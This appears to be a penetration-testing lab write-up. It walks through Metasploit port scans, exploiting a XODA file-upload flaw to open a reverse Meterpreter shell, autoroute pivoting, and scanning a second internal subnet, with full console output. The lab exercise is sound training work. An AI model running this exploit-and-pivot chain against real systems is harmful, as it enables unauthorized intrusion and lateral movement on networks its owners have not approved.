- Auxiliary modules are used to perform functionality like scanning, discovery and fuzzing
- We can use auxiliary modules to perform both the TCP and UDP port scanning as well as enumerating information from services like FTP,SSH,HTTP etc.
- Auxiliary modules can be used during the information gathering phase of a penetration test as well as the post exploitation phase.
- We can also use auxiliary modules to discover hosts and perform port scanning on a different network subnet after we have obtained initial access on a target system.

Where do we use these auxiliary modules ?
Like we are able to get the information for open ports on the system from NMAP so what is the purpose of these auxiliary modes. Here comes the answer we are able to scan the device from NMAP and able to exploit the machine and we found that the exploited machine is one of the many servers on a network to which we do not have access to. In that scenario it would be difficult to perform the NMAP scan as we do not have IP addresses on the other servers or devices on the network. For those scenarios these auxiliary modules are made so we can scan the other devices through the initially exploited server or target machine. While there is the other way that we export the nmap binary to the initial exploited machine and perform the NMAP scan which might risk the other key fundamental element of pentest getting caught.

- Our objective is to utilize auxiliary modules to discover open ports on our first target.
- The next step will involve exploiting the service running on the target in order to obtain a foothold.
- We will then utilize our foothold to access other systems on a different network subnet (pivoting)
- We will then utilize auxiliary modules to scan for open ports on the second target.


[Network Service Scanning](https://attack.mitre.org/techniques/T1046/) is a part of the exploitation as well as the post-exploitation phase and deals with identifying the services running on remote hosts.

In this lab, we are given access to a Kali machine. There are two target machines, one of the target machines is present on the same network. This target machine is vulnerable and can be exploited using the following information. Use this information to get a shell on the target machine and complete the mission!

Vulnerability Information

- Vulnerability: XODA File Upload Vulnerability
- Metasploit module: exploit/unix/webapp/xoda_file_upload

Your mission:

- Identify the ports open on the second target machine using appropriate Metasploit modules.
- Write a bash script to scan the ports of the second target machine.
- Upload the nmap static binary to the target machine and identify the services running on the second target machine.

References:

- Network Service Scanning ([https://attack.mitre.org/techniques/T1046/](https://attack.mitre.org/techniques/T1046/))

Instructions: 

- This lab is dedicated to you! No other users are on this network :)
- Once you start the lab, you will have access to a root terminal of a Kali instance
- Your Kali has an interface with IP address 192.X.Y.2. Run "ip addr" to know the values of X and Y.
- The target server should be located at the IP address 192.X.Y.3.
- Do not attack the gateway located at IP address 192.X.Y.1
- **The static binaries are present in the directory "/root/tools/"**

[[ip]]

```
root@attackdefense:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: ip_vti0@NONE: <NOARP> mtu 1480 qdisc noop state DOWN group default qlen 1000
    link/ipip 0.0.0.0 brd 0.0.0.0
15796: eth0@if15797: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:0a:01:00:05 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.1.0.5/16 brd 10.1.255.255 scope global eth0
       valid_lft forever preferred_lft forever
15800: eth1@if15801: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:c0:03:f8:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 192.3.248.2/24 brd 192.3.248.255 scope global eth1
       valid_lft forever preferred_lft forever
```

[[metasploit]]

```
root@attackdefense:~# service postgresql status
12/main (port 5432): down
root@attackdefense:~# service postgresql start && msfconsole
Starting PostgreSQL 12 database server: main.
       =[ metasploit v5.0.83-dev                          ]
+ -- --=[ 2003 exploits - 1100 auxiliary - 340 post       ]
+ -- --=[ 564 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Adapter names can be used for IP params set LHOST eth0

msf5 > db_status
[*] Connected to msf. Connection type: postgresql.
msf5 > workspace -a Port_Scan
[*] Added workspace: Port_Scan
[*] Workspace: Port_Scan
msf5 > workspace
  default
* Port_Scan
msf5 >
msf5 > search portscan

Matching Modules
================

   #  Name                                              Disclosure Date  Rank    Check  Description
   -  ----                                              ---------------  ----    -----  -----------
   0  auxiliary/scanner/http/wordpress_pingback_access                   normal  No     Wordpress Pingback Locator
   1  auxiliary/scanner/natpmp/natpmp_portscan                           normal  No     NAT-PMP External Port Scanner
   2  auxiliary/scanner/portscan/ack                                     normal  No     TCP ACK Firewall Scanner
   3  auxiliary/scanner/portscan/ftpbounce                               normal  No     FTP Bounce Port Scanner
   4  auxiliary/scanner/portscan/syn                                     normal  No     TCP SYN Port Scanner
   5  auxiliary/scanner/portscan/tcp                                     normal  No     TCP Port Scanner
   6  auxiliary/scanner/portscan/xmas                                    normal  No     TCP "XMas" Port Scanner
   7  auxiliary/scanner/sap/sap_router_portscanner                       normal  No     SAPRouter Port Scanner


msf5 > use 5
msf5 auxiliary(scanner/portscan/tcp) > options

Module options (auxiliary/scanner/portscan/tcp):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               yes       The number of concurrent ports to check per host
   DELAY        0                yes       The delay between connections, per thread, in milliseconds
   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS                        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   THREADS      1                yes       The number of concurrent threads (max one per host)
   TIMEOUT      1000             yes       The socket connect timeout in milliseconds

msf5 auxiliary(scanner/portscan/tcp) > set rhosts 192.3.248.3
rhosts => 192.3.248.3
msf5 auxiliary(scanner/portscan/tcp) > show options

Module options (auxiliary/scanner/portscan/tcp):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               yes       The number of concurrent ports to check per host
   DELAY        0                yes       The delay between connections, per thread, in milliseconds
   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS       192.3.248.3      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   THREADS      1                yes       The number of concurrent threads (max one per host)
   TIMEOUT      1000             yes       The socket connect timeout in milliseconds

msf5 auxiliary(scanner/portscan/tcp) > run

[+] 192.3.248.3:          - 192.3.248.3:80 - TCP OPEN
[*] 192.3.248.3:          - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/portscan/tcp) > curl 192.3.248.3
[*] exec: curl 192.3.248.3

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
        <title>XODA</title>
                <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
                        <script language="JavaScript" type="text/javascript">
                        //<![CDATA[
                        var countselected=0;
                        function stab(id){var _10=new Array();for(i=0;i<_10.length;i++){document.getElementById(_10[i]).className="tab";}document.getElementById(id).className="stab";}var allfiles=new Array('');
                        //]]>
                </script>
                <script language="JavaScript" type="text/javascript" src="/js/xoda.js"></script>
                <script language="JavaScript" type="text/javascript" src="/js/sorttable.js"></script>
                <link rel="stylesheet" href="/style.css" type="text/css" />
</head>

<body onload="document.lform.username.focus();">
        <div id="top">
                <a href="/" title="XODA"><span style="color: #56a;">XO</span><span style="color: #fa5;">D</span><span style="color: #56a;">A</span></a>
                        </div>
        <form method="post" action="/?log_in" name="lform" id="login">
                <p>Username:&nbsp;<input type="text" id="un" name="username" /></p>
                <p>Password:&nbsp;<input type="password" name="password" /></p>
                <p><input type="submit" name="submit" value="login" /></p>
        </form>
</body>
</html>
        msf5 auxiliary(scanner/portscan/tcp) > search xoda

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/webapp/xoda_file_upload  2012-08-21       excellent  Yes    XODA 0.4.5 Arbitrary PHP File Upload Vulnerability


msf5 auxiliary(scanner/portscan/tcp) > use 0
msf5 exploit(unix/webapp/xoda_file_upload) > options

Module options (exploit/unix/webapp/xoda_file_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /xoda/           yes       The base path to the web application
   VHOST                       no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   XODA 0.4.5


msf5 exploit(unix/webapp/xoda_file_upload) > set rhosts 192.3.248.3
rhosts => 192.3.248.3
msf5 exploit(unix/webapp/xoda_file_upload) > set targeturi /
targeturi => /
msf5 exploit(unix/webapp/xoda_file_upload) > show options

Module options (exploit/unix/webapp/xoda_file_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     192.3.248.3      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the web application
   VHOST                       no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   XODA 0.4.5


msf5 exploit(unix/webapp/xoda_file_upload) > exploit

[*] Started reverse TCP handler on 192.3.248.2:4444 
[*] Sending PHP payload (iMQSDAmzvsfzc.php)
[*] Executing PHP payload (iMQSDAmzvsfzc.php)
[*] Sending stage (38288 bytes) to 192.3.248.3
[*] Meterpreter session 1 opened (192.3.248.2:4444 -> 192.3.248.3:37598) at 2023-07-28 16:49:28 +0000
[!] Deleting iMQSDAmzvsfzc.php

meterpreter >
meterpreter > sysinfo
Computer    : victim-1
OS          : Linux victim-1 5.4.0-152-generic #169-Ubuntu SMP Tue Jun 6 22:23:09 UTC 2023 x86_64
Meterpreter : php/linux
meterpreter > shell
Process 794 created.
Channel 0 created.
/bin/bash -i
bash: cannot set terminal process group (426): Inappropriate ioctl for device
bash: no job control in this shell
www-data@victim-1:/app/files$ ifconfig
ifconfig
eth0      Link encap:Ethernet  HWaddr 02:42:c0:03:f8:03  
          inet addr:192.3.248.3  Bcast:192.3.248.255  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:10094 errors:0 dropped:0 overruns:0 frame:0
          TX packets:10054 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:830129 (830.1 KB)  TX bytes:550561 (550.5 KB)

eth1      Link encap:Ethernet  HWaddr 02:42:c0:cd:3e:02  
          inet addr:192.205.62.2  Bcast:192.205.62.255  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:21 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:1766 (1.7 KB)  TX bytes:0 (0.0 B)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)

www-data@victim-1:/app/files$ ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: ip_vti0@NONE: <NOARP> mtu 1480 qdisc noop state DOWN group default qlen 1000
    link/ipip 0.0.0.0 brd 0.0.0.0
15802: eth0@if15803: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:c0:03:f8:03 brd ff:ff:ff:ff:ff:ff
    inet 192.3.248.3/24 brd 192.3.248.255 scope global eth0
       valid_lft forever preferred_lft forever
15804: eth1@if15805: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:c0:cd:3e:02 brd ff:ff:ff:ff:ff:ff
    inet 192.205.62.2/24 brd 192.205.62.255 scope global eth1
       valid_lft forever preferred_lft forever
www-data@victim-1:/app/files$

meterpreter > run autoroute -s 192.205.62.3

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 192.205.62.3/255.255.255.0...
[+] Added route to 192.205.62.3/255.255.255.0 via 192.3.248.3
[*] Use the -p option to list all active routes
meterpreter > background
[*] Backgrounding session 1...
msf5 exploit(unix/webapp/xoda_file_upload) > sessions

Active sessions
===============

  Id  Name  Type                   Information               Connection
  --  ----  ----                   -----------               ----------
  1         meterpreter php/linux  www-data (33) @ victim-1  192.3.248.2:4444 -> 192.3.248.3:37598 (192.3.248.3)

msf5 exploit(unix/webapp/xoda_file_upload) > search portscan

Matching Modules
================

   #  Name                                              Disclosure Date  Rank    Check  Description
   -  ----                                              ---------------  ----    -----  -----------
   0  auxiliary/scanner/http/wordpress_pingback_access                   normal  No     Wordpress Pingback Locator
   1  auxiliary/scanner/natpmp/natpmp_portscan                           normal  No     NAT-PMP External Port Scanner
   2  auxiliary/scanner/portscan/ack                                     normal  No     TCP ACK Firewall Scanner
   3  auxiliary/scanner/portscan/ftpbounce                               normal  No     FTP Bounce Port Scanner
   4  auxiliary/scanner/portscan/syn                                     normal  No     TCP SYN Port Scanner
   5  auxiliary/scanner/portscan/tcp                                     normal  No     TCP Port Scanner
   6  auxiliary/scanner/portscan/xmas                                    normal  No     TCP "XMas" Port Scanner
   7  auxiliary/scanner/sap/sap_router_portscanner                       normal  No     SAPRouter Port Scanner


msf5 exploit(unix/webapp/xoda_file_upload) > use 5
msf5 auxiliary(scanner/portscan/tcp) > set rhosts 192.205.62.3
rhosts => 192.205.62.3
msf5 auxiliary(scanner/portscan/tcp) > options

Module options (auxiliary/scanner/portscan/tcp):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               yes       The number of concurrent ports to check per host
   DELAY        0                yes       The delay between connections, per thread, in milliseconds
   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS       192.205.62.3     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   THREADS      1                yes       The number of concurrent threads (max one per host)
   TIMEOUT      1000             yes       The socket connect timeout in milliseconds

msf5 auxiliary(scanner/portscan/tcp) > run

[+] 192.205.62.3:         - 192.205.62.3:22 - TCP OPEN
[+] 192.205.62.3:         - 192.205.62.3:21 - TCP OPEN
[+] 192.205.62.3:         - 192.205.62.3:80 - TCP OPEN
^C[*] 192.205.62.3:         - Caught interrupt from the console...
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/portscan/tcp) > search udp_sweep

Matching Modules
================

   #  Name                                   Disclosure Date  Rank    Check  Description
   -  ----                                   ---------------  ----    -----  -----------
   0  auxiliary/scanner/discovery/udp_sweep                   normal  No     UDP Service Sweeper


msf5 auxiliary(scanner/portscan/tcp) > use 0
msf5 auxiliary(scanner/discovery/udp_sweep) > options

Module options (auxiliary/scanner/discovery/udp_sweep):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BATCHSIZE  256              yes       The number of hosts to probe in each set
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   THREADS    10               yes       The number of concurrent threads

msf5 auxiliary(scanner/discovery/udp_sweep) > set rhosts 192.3.248.3
rhosts => 192.3.248.3
msf5 auxiliary(scanner/discovery/udp_sweep) > run

[*] Sending 13 probes to 192.3.248.3->192.3.248.3 (1 hosts)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/discovery/udp_sweep) >
```

